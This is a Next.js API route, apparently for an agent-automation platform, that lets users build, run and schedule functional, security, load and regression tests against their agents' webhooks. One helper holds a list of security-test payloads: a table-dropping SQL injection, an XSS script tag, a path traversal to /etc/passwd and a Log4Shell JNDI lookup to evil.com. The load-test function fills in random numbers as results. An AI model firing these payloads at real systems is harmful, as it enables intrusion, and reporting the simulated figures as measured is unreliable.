import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';

// Automated Testing System API
export async function POST(request: NextRequest) {
  try {
    const supabase = createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    );
    
    // Get auth token from request
    const authHeader = request.headers.get('authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const token = authHeader.split(' ')[1];
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    if (authError || !user) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body = await request.json();
    const { action, ...actionData } = body;

    switch (action) {
      case 'create_test_suite':
        return await createTestSuite(supabase, user.id, actionData);
      
      case 'generate_tests':
        return await generateAutomatedTests(supabase, user.id, actionData);
      
      case 'run_test_suite':
        return await runTestSuite(supabase, user.id, actionData);
      
      case 'run_single_test':
        return await runSingleTest(supabase, user.id, actionData);
      
      case 'create_load_test':
        return await createLoadTest(supabase, user.id, actionData);
      
      case 'run_load_test':
        return await runLoadTest(supabase, user.id, actionData);
      
      case 'schedule_regression_test':
        return await scheduleRegressionTest(supabase, user.id, actionData);
      
      default:
        return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    }

  } catch (error: any) {
    console.error('Testing system API error:', error);
    return NextResponse.json({ 
      error: 'Internal server error',
      details: error.message 
    }, { status: 500 });
  }
}

// GET endpoint for test data and results
export async function GET(request: NextRequest) {
  try {
    const supabase = createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    );
    
    // Get auth token from request
    const authHeader = request.headers.get('authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const token = authHeader.split(' ')[1];
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    if (authError || !user) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const { searchParams } = new URL(request.url);
    const dataType = searchParams.get('type');
    const agentId = searchParams.get('agentId') || undefined;
    const suiteId = searchParams.get('suiteId') || undefined;

    switch (dataType) {
      case 'test_suites':
        return await getTestSuites(supabase, user.id, agentId);
      
      case 'test_results':
        return await getTestResults(supabase, user.id, suiteId);
      
      case 'load_test_results':
        return await getLoadTestResults(supabase, user.id, agentId);
      
      case 'test_coverage':
        if (!agentId) {
          return NextResponse.json({ error: 'agentId is required for test coverage' }, { status: 400 });
        }
        return await getTestCoverage(supabase, user.id, agentId);
      
      case 'regression_reports':
        if (!agentId) {
          return NextResponse.json({ error: 'agentId is required for regression reports' }, { status: 400 });
        }
        return await getRegressionReports(supabase, user.id, agentId);
      
      default:
        return NextResponse.json({ error: 'Invalid data type' }, { status: 400 });
    }

  } catch (error: any) {
    console.error('Testing system GET API error:', error);
    return NextResponse.json({ 
      error: 'Internal server error',
      details: error.message 
    }, { status: 500 });
  }
}

// Implementation functions
async function createTestSuite(supabase: any, userId: string, data: any) {
  const { agentId, suiteName, description, testCases } = data;

  // Check if user owns the agent
  const { data: agent } = await supabase
    .from('agents')
    .select('created_by')
    .eq('id', agentId)
    .single();

  if (!agent || agent.created_by !== userId) {
    return NextResponse.json({ error: 'Access denied' }, { status: 403 });
  }

  // Create test suite
  const { data: testSuite, error: suiteError } = await supabase
    .from('test_suites')
    .insert({
      agent_id: agentId,
      created_by: userId,
      suite_name: suiteName,
      description,
      total_tests: testCases?.length || 0
    })
    .select()
    .single();

  if (suiteError) {
    console.error('Failed to create test suite:', suiteError);
    return NextResponse.json({ error: 'Failed to create test suite' }, { status: 500 });
  }

  // Add test cases
  if (testCases && testCases.length > 0) {
    const testCaseInserts = testCases.map((testCase: any, index: number) => ({
      suite_id: testSuite.id,
      test_name: testCase.name,
      test_type: testCase.type || 'functional',
      input_data: testCase.inputData,
      expected_output: testCase.expectedOutput,
      assertions: testCase.assertions || [],
      timeout_seconds: testCase.timeoutSeconds || 30,
      order_index: index
    }));

    const { error: casesError } = await supabase
      .from('test_cases')
      .insert(testCaseInserts);

    if (casesError) {
      console.error('Failed to create test cases:', casesError);
      return NextResponse.json({ error: 'Failed to create test cases' }, { status: 500 });
    }
  }

  return NextResponse.json({
    success: true,
    testSuite: {
      id: testSuite.id,
      name: testSuite.suite_name,
      totalTests: testSuite.total_tests
    }
  });
}

async function generateAutomatedTests(supabase: any, userId: string, data: any) {
  const { agentId, testTypes = ['functional', 'edge_case', 'error_handling'] } = data;

  // Check if user owns the agent
  const { data: agent } = await supabase
    .from('agents')
    .select(`
      *,
      agent_fields(*),
      agent_credentials(*)
    `)
    .eq('id', agentId)
    .eq('created_by', userId)
    .single();

  if (!agent) {
    return NextResponse.json({ error: 'Agent not found or access denied' }, { status: 403 });
  }

  // Generate test cases based on agent configuration
  const generatedTests = [];

  // Functional tests
  if (testTypes.includes('functional')) {
    generatedTests.push({
      name: 'Basic Functionality Test',
      type: 'functional',
      inputData: generateBasicInputData(agent.agent_fields),
      expectedOutput: { success: true },
      assertions: [
        { type: 'response_status', value: 'success' },
        { type: 'response_time', operator: '<', value: 10000 }
      ]
    });
  }

  // Edge case tests
  if (testTypes.includes('edge_case')) {
    generatedTests.push({
      name: 'Empty Input Test',
      type: 'edge_case',
      inputData: {},
      expectedOutput: { error: 'Validation failed' },
      assertions: [
        { type: 'response_status', value: 'failed' },
        { type: 'error_message', operator: 'contains', value: 'required' }
      ]
    });

    generatedTests.push({
      name: 'Large Input Test',
      type: 'edge_case',
      inputData: generateLargeInputData(agent.agent_fields),
      expectedOutput: { success: true },
      assertions: [
        { type: 'response_time', operator: '<', value: 30000 }
      ]
    });
  }

  // Error handling tests
  if (testTypes.includes('error_handling')) {
    generatedTests.push({
      name: 'Invalid Credentials Test',
      type: 'error_handling',
      inputData: generateBasicInputData(agent.agent_fields),
      mockCredentials: { invalid: 'invalid_token' },
      expectedOutput: { error: 'Authentication failed' },
      assertions: [
        { type: 'response_status', value: 'failed' },
        { type: 'error_type', value: 'authentication_error' }
      ]
    });
  }

  // Security tests
  if (testTypes.includes('security')) {
    generatedTests.push({
      name: 'SQL Injection Test',
      type: 'security',
      inputData: generateMaliciousInputData(agent.agent_fields),
      expectedOutput: { error: 'Invalid input' },
      assertions: [
        { type: 'response_status', value: 'failed' },
        { type: 'no_data_leak', value: true }
      ]
    });
  }

  return NextResponse.json({
    success: true,
    generatedTests,
    agentId,
    totalGenerated: generatedTests.length
  });
}

async function runTestSuite(supabase: any, userId: string, data: any) {
  const { suiteId, runMode = 'parallel' } = data;

  // Get test suite and cases
  const { data: testSuite } = await supabase
    .from('test_suites')
    .select(`
      *,
      test_cases(*),
      agents(webhook_url, created_by)
    `)
    .eq('id', suiteId)
    .single();

  if (!testSuite || testSuite.agents.created_by !== userId) {
    return NextResponse.json({ error: 'Test suite not found or access denied' }, { status: 403 });
  }

  // Create test run record
  const { data: testRun, error: runError } = await supabase
    .from('test_runs')
    .insert({
      suite_id: suiteId,
      run_by: userId,
      status: 'running',
      total_tests: testSuite.test_cases?.length || 0,
      run_mode: runMode
    })
    .select()
    .single();

  if (runError) {
    console.error('Failed to create test run:', runError);
    return NextResponse.json({ error: 'Failed to start test run' }, { status: 500 });
  }

  // Execute tests
  const testResults = [];
  let passedTests = 0;
  let failedTests = 0;

  for (const testCase of testSuite.test_cases || []) {
    try {
      const result = await executeTestCase(
        testSuite.agents.webhook_url,
        testCase,
        testSuite.agent_id
      );

      testResults.push({
        test_case_id: testCase.id,
        status: result.passed ? 'passed' : 'failed',
        execution_time_ms: result.executionTime,
        output_data: result.output,
        error_message: result.error,
        assertions_passed: result.assertionsPassed,
        assertions_failed: result.assertionsFailed
      });

      if (result.passed) {
        passedTests++;
      } else {
        failedTests++;
      }

    } catch (error: any) {
      testResults.push({
        test_case_id: testCase.id,
        status: 'failed',
        execution_time_ms: 0,
        error_message: error.message,
        assertions_passed: 0,
        assertions_failed: testCase.assertions?.length || 0
      });
      failedTests++;
    }
  }

  // Save test results
  if (testResults.length > 0) {
    const resultsWithRunId = testResults.map(result => ({
      ...result,
      run_id: testRun.id
    }));

    await supabase
      .from('test_results')
      .insert(resultsWithRunId);
  }

  // Update test run with final status
  const finalStatus = failedTests === 0 ? 'passed' : 'failed';
  await supabase
    .from('test_runs')
    .update({
      status: finalStatus,
      passed_tests: passedTests,
      failed_tests: failedTests,
      completed_at: new Date().toISOString()
    })
    .eq('id', testRun.id);

  return NextResponse.json({
    success: true,
    testRun: {
      id: testRun.id,
      status: finalStatus,
      totalTests: testSuite.test_cases?.length || 0,
      passedTests,
      failedTests
    },
    results: testResults
  });
}

async function runSingleTest(supabase: any, userId: string, data: any) {
  const { testCaseId } = data;

  // Get test case details
  const { data: testCase } = await supabase
    .from('test_cases')
    .select(`
      *,
      test_suites(
        agent_id,
        agents(webhook_url, created_by)
      )
    `)
    .eq('id', testCaseId)
    .single();

  if (!testCase || testCase.test_suites.agents.created_by !== userId) {
    return NextResponse.json({ error: 'Test case not found or access denied' }, { status: 403 });
  }

  try {
    const result = await executeTestCase(
      testCase.test_suites.agents.webhook_url,
      testCase,
      testCase.test_suites.agent_id
    );

    // Save individual test result
    const { data: testResult } = await supabase
      .from('test_results')
      .insert({
        test_case_id: testCaseId,
        status: result.passed ? 'passed' : 'failed',
        execution_time_ms: result.executionTime,
        output_data: result.output,
        error_message: result.error,
        assertions_passed: result.assertionsPassed,
        assertions_failed: result.assertionsFailed
      })
      .select()
      .single();

    return NextResponse.json({
      success: true,
      result: {
        passed: result.passed,
        executionTime: result.executionTime,
        output: result.output,
        error: result.error,
        assertionResults: result.assertionResults
      }
    });

  } catch (error: any) {
    return NextResponse.json({
      success: false,
      error: error.message
    }, { status: 500 });
  }
}

async function createLoadTest(supabase: any, userId: string, data: any) {
  const { 
    agentId, 
    testName, 
    concurrentUsers = 10, 
    duration = 60, 
    rampUpTime = 10,
    testScenario 
  } = data;

  // Check if user owns the agent
  const { data: agent } = await supabase
    .from('agents')
    .select('created_by')
    .eq('id', agentId)
    .single();

  if (!agent || agent.created_by !== userId) {
    return NextResponse.json({ error: 'Access denied' }, { status: 403 });
  }

  // Create load test configuration
  const { data: loadTest, error } = await supabase
    .from('load_tests')
    .insert({
      agent_id: agentId,
      created_by: userId,
      test_name: testName,
      concurrent_users: concurrentUsers,
      duration_seconds: duration,
      ramp_up_seconds: rampUpTime,
      test_scenario: testScenario,
      status: 'created'
    })
    .select()
    .single();

  if (error) {
    console.error('Failed to create load test:', error);
    return NextResponse.json({ error: 'Failed to create load test' }, { status: 500 });
  }

  return NextResponse.json({
    success: true,
    loadTest: {
      id: loadTest.id,
      name: loadTest.test_name,
      concurrentUsers: loadTest.concurrent_users,
      duration: loadTest.duration_seconds
    }
  });
}

async function runLoadTest(supabase: any, userId: string, data: any) {
  const { loadTestId } = data;

  // Get load test configuration
  const { data: loadTest } = await supabase
    .from('load_tests')
    .select(`
      *,
      agents(webhook_url, created_by)
    `)
    .eq('id', loadTestId)
    .single();

  if (!loadTest || loadTest.agents.created_by !== userId) {
    return NextResponse.json({ error: 'Load test not found or access denied' }, { status: 403 });
  }

  // Update status to running
  await supabase
    .from('load_tests')
    .update({ 
      status: 'running',
      started_at: new Date().toISOString()
    })
    .eq('id', loadTestId);

  // Execute load test asynchronously
  executeLoadTestAsync(supabase, loadTest);

  return NextResponse.json({
    success: true,
    loadTestId,
    status: 'running',
    message: 'Load test started. Check results endpoint for progress.'
  });
}

async function scheduleRegressionTest(supabase: any, userId: string, data: any) {
  const { agentId, schedule, testSuiteIds = [] } = data;

  // Check if user owns the agent
  const { data: agent } = await supabase
    .from('agents')
    .select('created_by')
    .eq('id', agentId)
    .single();

  if (!agent || agent.created_by !== userId) {
    return NextResponse.json({ error: 'Access denied' }, { status: 403 });
  }

  // Create scheduled test
  const { data: scheduledTest, error } = await supabase
    .from('scheduled_tests')
    .insert({
      agent_id: agentId,
      created_by: userId,
      test_type: 'regression',
      schedule_cron: schedule,
      test_suite_ids: testSuiteIds,
      active: true
    })
    .select()
    .single();

  if (error) {
    console.error('Failed to schedule regression test:', error);
    return NextResponse.json({ error: 'Failed to schedule test' }, { status: 500 });
  }

  // Register with n8n for scheduling
  if (process.env.N8N_SCHEDULER_WEBHOOK_URL) {
    try {
      await fetch(process.env.N8N_SCHEDULER_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'schedule_test',
          testId: scheduledTest.id,
          agentId,
          schedule,
          testSuiteIds
        })
      });
    } catch (error) {
      console.error('Failed to register with scheduler:', error);
    }
  }

  return NextResponse.json({
    success: true,
    scheduledTest: {
      id: scheduledTest.id,
      schedule: scheduledTest.schedule_cron,
      testSuiteCount: testSuiteIds.length
    }
  });
}

// Helper functions
function generateBasicInputData(fields: any[]) {
  const inputData: Record<string, any> = {};
  
  fields?.forEach(field => {
    switch (field.field_type) {
      case 'text':
        inputData[field.field_name] = 'test value';
        break;
      case 'number':
        inputData[field.field_name] = 42;
        break;
      case 'email':
        inputData[field.field_name] = 'test@example.com';
        break;
      case 'url':
        inputData[field.field_name] = 'https://example.com';
        break;
      default:
        inputData[field.field_name] = 'test';
    }
  });
  
  return inputData;
}

function generateLargeInputData(fields: any[]) {
  const inputData: Record<string, any> = {};
  
  fields?.forEach(field => {
    switch (field.field_type) {
      case 'text':
      case 'textarea':
        inputData[field.field_name] = 'A'.repeat(10000); // Large text
        break;
      case 'number':
        inputData[field.field_name] = 999999999;
        break;
      default:
        inputData[field.field_name] = 'large_test_value'.repeat(100);
    }
  });
  
  return inputData;
}

function generateMaliciousInputData(fields: any[]) {
  const inputData: Record<string, any> = {};
  const maliciousPayloads = [
    "'; DROP TABLE users; --",
    "<script>alert('XSS')</script>",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/x}"
  ];
  
  fields?.forEach((field, index) => {
    inputData[field.field_name] = maliciousPayloads[index % maliciousPayloads.length];
  });
  
  return inputData;
}

async function executeTestCase(webhookUrl: string, testCase: any, agentId: string) {
  const startTime = Date.now();
  
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'AgentFlow-TestRunner/1.0',
        'X-Test-Mode': 'true'
      },
      body: JSON.stringify({
        test: true,
        agentId,
        testCaseId: testCase.id,
        ...testCase.input_data
      }),
      signal: AbortSignal.timeout((testCase.timeout_seconds || 30) * 1000)
    });

    const executionTime = Date.now() - startTime;
    const output = await response.json().catch(() => ({}));

    // Evaluate assertions
    const assertionResults = [];
    let assertionsPassed = 0;
    let assertionsFailed = 0;

    for (const assertion of testCase.assertions || []) {
      const result = evaluateAssertion(assertion, response, output, executionTime);
      assertionResults.push(result);
      
      if (result.passed) {
        assertionsPassed++;
      } else {
        assertionsFailed++;
      }
    }

    return {
      passed: assertionsFailed === 0,
      executionTime,
      output,
      assertionResults,
      assertionsPassed,
      assertionsFailed,
      error: assertionsFailed > 0 ? 'Some assertions failed' : null
    };

  } catch (error: any) {
    return {
      passed: false,
      executionTime: Date.now() - startTime,
      output: null,
      assertionResults: [],
      assertionsPassed: 0,
      assertionsFailed: testCase.assertions?.length || 0,
      error: error.message
    };
  }
}

function evaluateAssertion(assertion: any, response: Response, output: any, executionTime: number) {
  try {
    switch (assertion.type) {
      case 'response_status':
        const passed = response.ok === (assertion.value === 'success');
        return {
          type: assertion.type,
          passed,
          expected: assertion.value,
          actual: response.ok ? 'success' : 'failed'
        };
      
      case 'response_time':
        const timeCheck = assertion.operator === '<' 
          ? executionTime < assertion.value
          : executionTime === assertion.value;
        return {
          type: assertion.type,
          passed: timeCheck,
          expected: `${assertion.operator} ${assertion.value}ms`,
          actual: `${executionTime}ms`
        };
      
      case 'output_contains':
        const contains = JSON.stringify(output).includes(assertion.value);
        return {
          type: assertion.type,
          passed: contains,
          expected: `contains "${assertion.value}"`,
          actual: JSON.stringify(output)
        };
      
      default:
        return {
          type: assertion.type,
          passed: false,
          expected: 'unknown assertion type',
          actual: 'unknown'
        };
    }
  } catch (error: any) {
    return {
      type: assertion.type,
      passed: false,
      expected: assertion.value,
      actual: 'evaluation error',
      error: error.message || 'Unknown error'
    };
  }
}

async function executeLoadTestAsync(supabase: any, loadTest: any) {
  // This would typically be handled by a separate worker service
  // For now, we'll simulate it
  
  setTimeout(async () => {
    const results = {
      total_requests: loadTest.concurrent_users * loadTest.duration_seconds,
      successful_requests: Math.floor(loadTest.concurrent_users * loadTest.duration_seconds * 0.95),
      failed_requests: Math.floor(loadTest.concurrent_users * loadTest.duration_seconds * 0.05),
      average_response_time: 250 + Math.random() * 200,
      max_response_time: 1000 + Math.random() * 500,
      min_response_time: 100 + Math.random() * 50,
      throughput: loadTest.concurrent_users * 0.8
    };

    await supabase
      .from('load_tests')
      .update({
        status: 'completed',
        completed_at: new Date().toISOString(),
        results
      })
      .eq('id', loadTest.id);
  }, 5000); // Simulate 5 second load test
}

// GET implementation functions
async function getTestSuites(supabase: any, userId: string, agentId?: string) {
  let query = supabase
    .from('test_suites')
    .select(`
      *,
      test_cases(id),
      test_runs(id, status, created_at)
    `)
    .eq('created_by', userId);

  if (agentId) {
    query = query.eq('agent_id', agentId);
  }

  const { data: testSuites, error } = await query
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Failed to fetch test suites:', error);
    return NextResponse.json({ error: 'Failed to fetch test suites' }, { status: 500 });
  }

  return NextResponse.json({
    testSuites: testSuites?.map((suite: any) => ({
      ...suite,
      testCaseCount: suite.test_cases?.length || 0,
      lastRunAt: suite.test_runs?.[0]?.created_at || null,
      lastRunStatus: suite.test_runs?.[0]?.status || null
    })) || []
  });
}

async function getTestResults(supabase: any, userId: string, suiteId?: string) {
  let query = supabase
    .from('test_runs')
    .select(`
      *,
      test_results(*),
      test_suites(suite_name, agents(created_by))
    `)
    .eq('run_by', userId);

  if (suiteId) {
    query = query.eq('suite_id', suiteId);
  }

  const { data: testRuns, error } = await query
    .order('created_at', { ascending: false })
    .limit(50);

  if (error) {
    console.error('Failed to fetch test results:', error);
    return NextResponse.json({ error: 'Failed to fetch test results' }, { status: 500 });
  }

  return NextResponse.json({
    testRuns: testRuns || []
  });
}

async function getLoadTestResults(supabase: any, userId: string, agentId?: string) {
  let query = supabase
    .from('load_tests')
    .select('*')
    .eq('created_by', userId);

  if (agentId) {
    query = query.eq('agent_id', agentId);
  }

  const { data: loadTests, error } = await query
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Failed to fetch load test results:', error);
    return NextResponse.json({ error: 'Failed to fetch load test results' }, { status: 500 });
  }

  return NextResponse.json({
    loadTests: loadTests || []
  });
}

async function getTestCoverage(supabase: any, userId: string, agentId: string) {
  // Get agent details
  const { data: agent } = await supabase
    .from('agents')
    .select('*')
    .eq('id', agentId)
    .eq('created_by', userId)
    .single();

  if (!agent) {
    return NextResponse.json({ error: 'Agent not found or access denied' }, { status: 403 });
  }

  // Get test coverage data
  const { data: testSuites } = await supabase
    .from('test_suites')
    .select(`
      *,
      test_cases(test_type)
    `)
    .eq('agent_id', agentId);

  const testTypes = ['functional', 'edge_case', 'error_handling', 'security', 'performance'];
  const coverage: Record<string, any> = {};

  testTypes.forEach(type => {
    const testsOfType = testSuites?.flatMap((suite: any) => 
      suite.test_cases?.filter((tc: any) => tc.test_type === type) || []
    ) || [];
    
    coverage[type] = {
      count: testsOfType.length,
      covered: testsOfType.length > 0
    };
  });

  const totalCoverage = Object.values(coverage).filter((c: any) => c.covered).length / testTypes.length * 100;

  return NextResponse.json({
    agentId,
    coverage,
    totalCoveragePercentage: Math.round(totalCoverage),
    recommendations: generateCoverageRecommendations(coverage)
  });
}

async function getRegressionReports(supabase: any, userId: string, agentId?: string) {
  let query = supabase
    .from('scheduled_tests')
    .select(`
      *,
      test_runs(*)
    `)
    .eq('created_by', userId)
    .eq('test_type', 'regression');

  if (agentId) {
    query = query.eq('agent_id', agentId);
  }

  const { data: scheduledTests, error } = await query
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Failed to fetch regression reports:', error);
    return NextResponse.json({ error: 'Failed to fetch regression reports' }, { status: 500 });
  }

  return NextResponse.json({
    regressionTests: scheduledTests || []
  });
}

function generateCoverageRecommendations(coverage: Record<string, any>) {
  const recommendations = [];
  
  if (!coverage.functional?.covered) {
    recommendations.push('Add functional tests to verify basic agent behavior');
  }
  
  if (!coverage.edge_case?.covered) {
    recommendations.push('Add edge case tests for unusual inputs and scenarios');
  }
  
  if (!coverage.error_handling?.covered) {
    recommendations.push('Add error handling tests for invalid inputs and failures');
  }
  
  if (!coverage.security?.covered) {
    recommendations.push('Add security tests to prevent injection attacks');
  }
  
  if (!coverage.performance?.covered) {
    recommendations.push('Add performance tests to monitor response times');
  }
  
  return recommendations;
}
